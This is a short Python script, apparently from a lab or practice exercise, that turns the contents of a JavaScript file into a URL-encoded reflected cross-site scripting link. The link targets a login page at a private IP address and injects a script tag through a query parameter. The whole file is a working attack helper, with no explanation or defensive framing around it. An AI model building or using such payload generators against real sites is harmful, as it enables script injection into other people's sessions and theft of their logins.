import urllib.parse

QUERY_VAR = 'a'
JS_SCRIPT = 'xss.js'
VICTIM_URL = 'http://192.168.30.100/login.php'

with open(JS_SCRIPT, 'r') as xss:
	js = xss.read()
	formattedJs = js.replace('\n', '')
	encodedJs = urllib.parse.quote(formattedJs)
	print('{}?{}=<script>{}</script>'.format(VICTIM_URL, QUERY_VAR, encodedJs))
